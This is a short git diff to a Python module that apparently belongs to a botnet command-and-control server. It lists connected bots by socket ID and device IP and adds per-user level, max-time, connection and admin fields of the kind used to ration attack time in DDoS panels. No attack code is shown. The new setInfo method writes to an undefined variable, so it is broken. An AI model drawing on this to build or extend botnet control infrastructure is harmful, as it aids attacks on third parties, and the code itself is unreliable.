@@ -11,6 +11,10 @@ class Strings:
 
 	CurrentUser = ""
 	CurrentIP = ""
+	CurrentLvl = ""
+	CurrentMtime = ""
+	CurrentConn = ""
+	CurrentAdmin = ""
 
 	appInfo = {
 		"appCreator": "Zerda",
@@ -57,19 +61,6 @@ class Strings:
 		"Clear": "\033[2J\033[1;1H"
 	}
 
-	def GetCurrentUsername(socket):
-		for u in ServerConfig.clients:
-			if u[1] == socket:
-				return u[0]
-
-		return "[x] Failed!"
-
-	def GetCurrentIP(socket):
-		for u in ServerConfig.clients:
-			if u[1] == socket:
-				return u[2]
-
-		return "[x] Failed!"
 
 	def show_all_clients():
 		g = 0
@@ -86,3 +77,15 @@ class Strings:
 			bot_list += str(f"Socket ID: {h} | Device IP: {u[2]}\r\n")
 			h += 1
 		return bot_list
+
+
+class ServerFunc:
+	def setInfo(user):
+		info = CRUD.GetUser(user).split(",")
+		i = 0
+		for usr in ServerConfig.clients:
+			if usr[0] == user:
+				u[4] = info[3] #lvl
+				u[5] = info[4] #maxtime
+				u[6] = info[5] #con
+				u[7] = info[7] #admin
